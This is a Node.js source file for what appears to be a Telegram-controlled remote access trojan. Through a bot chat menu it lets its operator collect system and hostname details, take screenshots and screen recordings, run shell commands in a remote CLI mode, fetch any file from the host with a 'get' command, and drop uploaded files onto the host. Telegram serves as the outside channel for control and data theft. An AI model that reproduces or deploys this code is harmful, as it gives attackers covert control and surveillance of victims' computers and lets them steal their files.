process.env.NTBA_FIX_319 = 1;
const TelegramBot = require('node-telegram-bot-api');
const EventEmitter = require('events');
const Os = require("os")
const { spawn } = require("child_process");
const { getCurrentDirectory, handleShellCommand, handleUploader } = require('./utils/commands');
const { startRecording, stopRecording } = require('./utils/recorder');
const screenshot = require('screenshot-desktop');
const bot = new TelegramBot(require('./config/config.json').SECRET_KEY, { polling: true });
const botevt = new EventEmitter();

let recorderMode = false;
let cliMode = false; 
let uploadMode = false; 
let currentDirectory = '';
let save_file = '';

bot.onText(/\/echo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const resp = match[1];
    bot.sendMessage(chatId, resp);
});

bot.on('callback_query', async (msg) => {
    const chatId = msg.message.chat.id;
    return bot.sendMessage(chatId, msg.data);
})

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    let data

    if (msg.text == '/start' || msg.text == 'Exit CLI' || msg.text == 'Back' || msg.text == 'Stop Recording') {
        
        cliMode = false;
        recorderMode = false;

        currentDirectory = '';

        if(msg.text == 'Stop Recording') {
            stopRecording()
        }
     
        return bot.sendMessage(chatId, 'What do you want to do?', {
            reply_markup: {
                keyboard: [
                    ['Hostname', {text: 'System Info', }, 'Upload File'],
                    ['Screenshot', 'Screen Recorder', 'CLI']
                ],
                resize_keyboard: true,
                force_reply: true
            }
        });
    }

    if(cliMode) {
        return await handleShellCommand(bot, msg)
    }

    if (msg.text == 'os') {
        data = await os()
        return bot.sendMessage(chatId, data);
    }

    if (msg.text == 'System Info') {
        data = await userInfo()
        return bot.sendMessage(chatId, data);
    }

    if (msg.text == 'Hostname') {
        data = await hostname()
        return bot.sendMessage(chatId, data);
    }

    if (msg.text == 'Upload File') {
        return await handleUploader(bot, msg)
    }

    // ffmpeg most be installed
    if (msg.text == 'Start Recording' || recorderMode) {
        recorderMode = true;
        platform_os = await os();
        
        let filename = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);

        if(platform_os == 'win32') { 
            save_file = `c:\\temp\\b_${filename}.mp4`} 
        else if(platform_os == 'linux') { 
            save_file = `/tmp/b_${filename}.mp4` 
        } 

        startRecording({path: save_file})
        return bot.sendMessage(chatId, 'File location: ' + save_file)
    }

    if (msg.text && msg.text.startsWith('get')) {
        try {
            let p = msg.text.split('get')[1].trim()

            return bot.sendDocument(chatId, p)
        } catch (error) {
            console.log(error);
            return bot.sendMessage(chatId, '?');
        }
    }

    if (msg.text == 'Screen Recorder') {
        return bot.sendMessage(chatId, 'Screen Recorder Mode', {
            reply_markup: {
                keyboard: [
                    [{text: 'Start Recording'}, {text: 'Stop Recording'}]
                ],
                force_reply: true,
                resize_keyboard: true
            }
        }) 
    }

    if (msg.text == 'screenshot' || msg.text == 'Screenshot') {
        try {
            const buffer = await screenshot({ format: 'png' })
            return bot.sendPhoto(chatId, buffer, {}, {
                contentType: 'application/octet-stream',
                filename: 'screenshot'
            })
        } catch (error) {
            if(error) {
                return bot.sendMessage(chatId, error.message);
            }
        }
    }

    if (msg.text == 'CLI') {

        cliMode = true;
        currentDirectory = getCurrentDirectory(Os.platform())

        try {
            return bot.sendMessage(chatId, '*CLI Mode*\nYour current location is ' + currentDirectory, {
                reply_markup: {
                    keyboard: [
                        [{text: 'Exit CLI'}]
                    ],
                    force_reply: true,
                    resize_keyboard: true
                }
            })            
        } catch (error) {
            console.log(error);
            return bot.sendMessage(chatId, '?');
        }
    }


    // if (msg.text.startsWith('>')) {
    //     try {
    //         var command = msg.text.split('>')[1].trim()

    //         botevt.removeAllListeners('executeCommand')
            
    //         await execute(command)
    //         botevt.on('executeCommand', (output) => {
    //             return bot.sendMessage(chatId, output)            
    //         })

    //     } catch (error) {
    //         console.log(error);
    //         return bot.sendMessage(chatId, '?');
    //     }
    // }
    // else {
    //     return bot.sendMessage(chatId, `Sorry. I can't understand japanese`);
    // }
});

bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const fileId = msg.document.file_id;

    let location = msg.caption ? msg.caption : getCurrentDirectory(await Os.platform()).replace('\n', '');;

    bot.downloadFile(fileId, location).then((res) => {
        return bot.sendMessage(chatId, 'The file was sent successfully')
    })
})


async function os() {
    return Os.platform()
}

async function userInfo() {
    const info =
        `platform: ${Os.platform()}
hostname: ${Os.hostname()}
ostype: ${Os.type()}
kernel: ${Os.version()}
release: ${Os.release()}
homedir: ${Os.homedir()}
arch: ${Os.arch()}
totalmem: ${Os.totalmem()}
freemem: ${Os.freemem()}`
    return info
}

async function hostname() {
    return Os.hostname()
}

async function execute(command) {
    try {
        const spwn = spawn(command, [], { shell: true })
        spwn.stdout.on('data', function(data) {
            botevt.emit('executeCommand', data.toString())
        })

        spwn.stdout.on('error', function(data) {
            console.log('error');
            throw data.toString()
        })
    } catch (err) {
        console.log(err);
        return err.message
    }
}


